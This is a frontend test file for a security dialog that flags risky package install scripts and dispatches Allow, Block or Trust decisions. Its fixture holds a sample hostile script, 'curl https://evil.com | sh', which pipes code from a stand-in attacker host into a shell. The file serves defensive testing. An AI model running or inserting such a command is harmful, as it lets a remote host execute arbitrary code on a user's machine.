import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen, fireEvent, act } from "@testing-library/react";

import { commands, type GuardEvent } from "@/lib/bindings";
import { useGuardStore } from "@/store/guard";

import { GuardDialog } from "./GuardDialog";

const sampleEvent: GuardEvent = {
  id: "guard-1",
  package: "evil-pkg",
  version: "1.0.0",
  script: "curl https://evil.com | sh",
  risk_level: "high",
  matched_rules: ["NET001", "EXEC014"],
};

beforeEach(() => {
  vi.spyOn(commands, "submitGuardDecision").mockResolvedValue({
    status: "ok",
    data: null,
  });
  vi.spyOn(commands, "reportVisible").mockResolvedValue({
    status: "ok",
    data: null,
  });
  act(() => {
    useGuardStore.setState({
      currentEvent: sampleEvent,
      inFlight: false,
    });
  });
});

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

describe("GuardDialog", () => {
  it("renders package, version, script, and matched rules", () => {
    render(<GuardDialog event={sampleEvent} />);
    expect(screen.getByText("evil-pkg")).toBeInTheDocument();
    expect(screen.getByText("1.0.0")).toBeInTheDocument();
    expect(screen.getByText("curl https://evil.com | sh")).toBeInTheDocument();
    expect(screen.getByText("NET001")).toBeInTheDocument();
    expect(screen.getByText("EXEC014")).toBeInTheDocument();
  });

  it("renders a severity badge matching risk_level weight", () => {
    render(<GuardDialog event={sampleEvent} />);
    const badge = screen.getByText(/high/i);
    expect(badge).toHaveAttribute("data-severity", "high");
  });

  it("falls back to a 'no rules' message when the rule list is empty", () => {
    const empty: GuardEvent = { ...sampleEvent, matched_rules: [] };
    render(<GuardDialog event={empty} />);
    expect(screen.getByTestId("no-rules")).toBeInTheDocument();
  });

  it("dispatches Allow via submitGuardDecision", async () => {
    render(<GuardDialog event={sampleEvent} />);
    fireEvent.click(screen.getByTestId("allow-once"));
    await act(async () => {});
    expect(commands.submitGuardDecision).toHaveBeenCalledWith("guard-1", "Allow");
  });

  it("dispatches Block via submitGuardDecision", async () => {
    render(<GuardDialog event={sampleEvent} />);
    fireEvent.click(screen.getByTestId("block"));
    await act(async () => {});
    expect(commands.submitGuardDecision).toHaveBeenCalledWith("guard-1", "Block");
  });

  it("dispatches Trust via submitGuardDecision", async () => {
    render(<GuardDialog event={sampleEvent} />);
    fireEvent.click(screen.getByTestId("trust"));
    await act(async () => {});
    expect(commands.submitGuardDecision).toHaveBeenCalledWith("guard-1", "Trust");
  });

  it("declares an accessible alertdialog with title and description", () => {
    render(<GuardDialog event={sampleEvent} />);
    const dialog = screen.getByRole("alertdialog");
    expect(dialog).toHaveAttribute("aria-modal", "true");
    expect(dialog).toHaveAttribute("aria-labelledby", "guard-title");
    expect(dialog).toHaveAttribute("aria-describedby", "guard-script");
  });
});
